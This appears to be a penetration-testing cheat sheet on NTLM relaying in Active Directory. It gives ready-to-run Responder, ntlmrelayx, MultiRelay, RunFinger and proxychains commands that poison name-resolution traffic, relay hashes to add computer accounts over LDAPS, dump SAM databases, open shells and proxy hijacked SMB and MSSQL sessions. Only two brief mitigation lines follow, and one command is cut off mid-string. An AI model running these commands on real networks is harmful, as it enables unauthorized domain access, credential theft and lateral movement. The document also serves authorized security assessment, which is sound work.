# NTLM Relaying attacks

## LDAP signing not required and LDAP channel binding disabled

### During security assessment, sometimes we don't have any account to perform the audit. Therefore we can inject ourselves into the Active Directory by performing NTLM relaying attack. For this technique three requirements are needed:

#### 1) LDAP signing not required (by default set to Not required )

#### 2) LDAP channel binding is disabled. (by default disabled)

#### 3) ms-DS-MachineAccountQuota needs to be at least at 1 for the account relayed (10 by default)

### Then we can use a tool to poison LLMNR , MDNS and NETBIOS requests on the network such as Responder and use ntlmrelayx to add our computer.

#### 1) Responder on 1 terminal

    sudo ./Responder.py -I eth0 -wfrd -P -v

#### 2) Ntlmrelayx on 2 terminal

    sudo python ./ntlmrelayx.py -t ldaps://IP_DC --add-computer

## It is required here to relay to LDAP over TLS because creating accounts is not allowed over an unencrypted connection.

# SMB Signing Disabled and IPv4

### If a machine has SMB signing : disabled , it is possible to use Responder with Multirelay.py script to perform an NTLMv2 hashes relay and get a shell access on the machine. Also called LLMNR/NBNS Poisoning

#### 1) Open the Responder.conf file and set the value of SMB and HTTP to Off 

#### 2) Run RunFinger.py to detect machine with SMB signing: disabled https://github.com/tholum/PiBunny/blob/master/system.d/library/tools_installer/tools_to_install/responder/tools/RunFinger.py

    python RunFinger.py -i IP_RANGE

#### 3) Run Responder

    sudo responder -I INTERFACE

#### 4) Use a relay tool such as ntlmrelayx or MultiRelay

    impacket-ntlmrelayx -tf targets.txt (Dump the SAM database of the targets in the list)

    python MultiRelay.py -t TARGET_IP -u ALL

#### 5) ntlmrelayx can also act as a SOCK proxy with every compromised sessions

    impacket-ntlmrelayx -tf /tmp/targets.txt -socks -smb2support

### You might need to select a target with "-t"

    impacket-ntlmrelayx -t mssql://10.10.10.10 -socks -smb2support

    impacket-ntlmrelayx -t smb://10.10.10.10 -socks -smb2support

### The socks proxy can then be used with your Impacket tools or CrackMapExec

    proxychains impacket-mssqlclient DOMAIN/USER@10.10.10.10 -windows-auth

    proxychains crackmapexec mssql 10.10.10.10 -u user -p '' -d DOMAIN -q "SELECT

    proxychains impacket-smbclient //192.168.48.230/Users -U contoso/normaluser1

## MITIGATIONS

#### 1) Disable LLMNR via group policy

#### 2) Disable NBT-NS
